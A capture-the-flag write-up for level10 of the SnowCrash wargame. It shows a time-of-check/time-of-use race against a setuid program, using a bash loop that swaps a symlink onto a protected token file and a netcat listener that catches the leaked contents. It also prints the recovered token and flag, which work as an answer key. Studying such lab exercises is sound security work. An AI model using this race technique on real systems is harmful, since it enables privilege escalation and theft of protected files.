For this level we see 2 files 

	level10@SnowCrash:~$ ls
	level10  token

We try to execute level10 with the token on argument

	level10@snowcrash:~$ ./level10 token
	./level10 file host
		sends file to host if you have access to it

We understand that we need to send a file to an host
We need to have access to this file

When we look at the strings in the level10 executable we see that it use open and access

But it is a huge security problem because there is a delta time between the check for the right access and the opening of the file.

So we are gonna use that.

We need to do a bash script that is going to create simlink to a file that we have access and a the token file so it is going to be a time where the program try to access the file we have access to and then will open the file we want to open and we don't have access to.

	#! /bin/bash

	while true; do
			touch /tmp/link
			rm -f /tmp/link
			ln -s /home/user/level10/token /tmp/link
			rm -f /tmp/link
	done


We also see that the program is connecting to the port 6969.
So we need to listen on this port and launch our script to create the simlinks with : nc -lk 6969

Then we need to launch the level10 program
To make that easier we will make a bash script that launch this script in an infinite loop

	#! /bin/bash

	while true; do 
		/home/user/level10/level10 /tmp/link 192.168.1.11
	done

And now we just have to take the content of the token file

	.*( )*.
	.*( )*.
	.*( )*.
	.*( )*.
	.*( )*.
	woupa2yuojeeaaed06riuj63c
	.*( )*.
	.*( )*.
So we use woupa2yuojeeaaed06riuj63c to connect to flag10

	level10@SnowCrash:~$ su flag10
	Password: 
	Don't forget to launch getflag !

Then launch getflag

	flag10@SnowCrash:~$ getflag
	Check flag.Here is your token : feulo4b72j7edeahuete3no7c



